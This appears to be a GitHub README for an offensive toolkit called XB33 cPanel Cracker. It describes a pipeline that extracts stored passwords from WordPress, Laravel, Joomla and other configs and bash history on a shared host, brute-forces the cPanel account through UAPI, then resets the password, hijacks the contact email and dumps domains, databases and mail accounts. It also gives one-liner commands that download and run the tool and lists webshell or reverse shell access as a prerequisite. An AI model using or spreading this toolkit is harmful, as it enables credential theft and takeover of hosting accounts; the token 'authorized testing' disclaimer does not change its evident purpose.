<p align="center">
  <img src="https://img.shields.io/badge/version-2.0-red?style=for-the-badge" />
  <img src="https://img.shields.io/badge/platform-linux-green?style=for-the-badge&logo=linux" />
  <img src="https://img.shields.io/badge/target-cPanel-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/license-MIT-yellow?style=for-the-badge" />
</p>

```
  ██╗  ██╗██████╗ ██████╗ ██████╗ 
  ╚██╗██╔╝██╔══██╗╚════██╗╚════██╗
   ╚███╔╝ ██████╔╝ █████╔╝ █████╔╝
   ██╔██╗ ██╔══██╗ ╚═══██╗ ╚═══██╗
  ██╔╝ ██╗██████╔╝██████╔╝██████╔╝
  ╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═════╝ 
  
  cPanel Password Cracker v2.0
```

# XB33 cPanel Cracker

**Automated cPanel password extraction, cracking, and reset toolkit.**  
Extracts stored credentials from web application configs, generates intelligent password mutations, and brute-forces cPanel UAPI to crack the account password — all in one command.

---

## ⚡ Quick Start

### One-liner (wget)
```bash
wget https://github.com/seo-soon/xb33cpcrack/raw/main/xb33cpcrack.tgz --no-check-certificate -q && tar xzf xb33cpcrack.tgz && rm -f xb33cpcrack.tgz && cd xb33cpcrack && chmod +x xb33cpcrack && ./xb33cpcrack
```

### One-liner (curl)
```bash
curl -fsSLk https://github.com/seo-soon/xb33cpcrack/raw/main/xb33cpcrack.tgz -o xb33cpcrack.tgz && tar xzf xb33cpcrack.tgz && rm -f xb33cpcrack.tgz && cd xb33cpcrack && chmod +x xb33cpcrack && ./xb33cpcrack
```

### With custom password & email
```bash
./xb33cpcrack "MyNewPass123!" "myemail@gmail.com"
```

---

## 🔥 Features

| Phase | Description |
|-------|-------------|
| **User Detection** | Auto-detect cPanel user, home directory, OS, kernel, jailshell status |
| **Sudo Check** | Instant root if `NOPASSWD` sudo is available |
| **Password Extraction** | Scans WordPress, Laravel, vBulletin, Joomla, Drupal, `.my.cnf`, `.bash_history` |
| **Password Mutations** | Generates variations: leet speak, case changes, common suffixes, domain-based guesses |
| **Brute Force** | Tests all candidates against cPanel UAPI with real-time progress bar |
| **Post-Exploit** | Auto-changes contact email + password, dumps domains, databases, email accounts |
| **Report** | Clean summary with cracked credentials |

---

## 📋 Supported CMS Config Extraction

| CMS / Framework | Config File | Fields Extracted |
|-----------------|-------------|------------------|
| WordPress | `wp-config.php` | `DB_PASSWORD`, `DB_USER` |
| Laravel | `.env` | `DB_PASSWORD`, `MAIL_PASSWORD`, `APP_KEY` |
| vBulletin | `core/includes/config.php` | `MasterServer password` |
| Joomla | `configuration.php` | `$password` |
| Drupal | `sites/default/settings.php` | `password` |
| Generic | `config.php`, `db.php`, `conn.php` | Any `password=` patterns |
| MySQL | `.my.cnf` | `password` |
| History | `.bash_history` | Grep password-like strings |

---

## 🧠 How It Works

```
┌─────────────────────┐
│  1. DETECT USER     │ ← whoami, home dir, kernel, sudo check
├─────────────────────┤
│  2. EXTRACT PASSES  │ ← scan all CMS configs in home directory
├─────────────────────┤
│  3. MUTATE          │ ← generate 100+ variations per password
├─────────────────────┤
│  4. BRUTE FORCE     │ ← test each via cPanel UAPI endpoint
├─────────────────────┤
│  5. POST-EXPLOIT    │ ← change email, reset password, dump loot
├─────────────────────┤
│  6. REPORT          │ ← clean summary output
└─────────────────────┘
```

The tool leverages **cPanel's UAPI** (`ContactInformation::set_email_addresses`) which requires the current password as a parameter. By testing extracted passwords against this endpoint, it validates credentials without triggering lockout mechanisms.

---

## 🎯 Usage

```bash
# Default — cracks and sets password to "XB33cr4ck3d!"
./xb33cpcrack

# Custom password
./xb33cpcrack "NewPassword123!"

# Custom password + change contact email
./xb33cpcrack "NewPassword123!" "attacker@email.com"
```

---

## 📦 Manual Installation

```bash
git clone https://github.com/seo-soon/xb33cpcrack.git
cd xb33cpcrack
chmod +x xb33cpcrack
./xb33cpcrack
```

---

## ⚠️ Requirements

- Linux server with **cPanel** (shared hosting, VPS, dedicated)
- Shell access (SSH, webshell, or reverse shell)
- **Bash 4+** (standard on all modern cPanel servers)
- `uapi` command available (included in cPanel jailshell)

---

## 🛡️ Limitations

- Will **not** work if cPanel password is completely unique (not reused from any web app)
- `nosuid` filesystems prevent sudo/SUID privilege escalation
- cPanel may rate-limit UAPI calls on some configurations
- Requires at least one web application with stored DB credentials

---

## 📝 Changelog

### v2.0 (2026-08-20)
- Full rewrite with 6-phase pipeline
- Added vBulletin, Drupal, Laravel support
- Intelligent password mutation engine
- Real-time progress bar
- Auto post-exploit (email change + password reset)
- Domain-based password guessing
- Bash history scanning
- Clean report output

### v1.0 (2026-07-15)
- Initial release
- WordPress-only extraction
- Basic brute force

---

## 📄 License

MIT License — Use at your own risk. For authorized penetration testing only.

---

<p align="center">
  <b>XB33 cPanel Cracker</b> — <i>Because password reuse is the real vulnerability.</i>
</p>
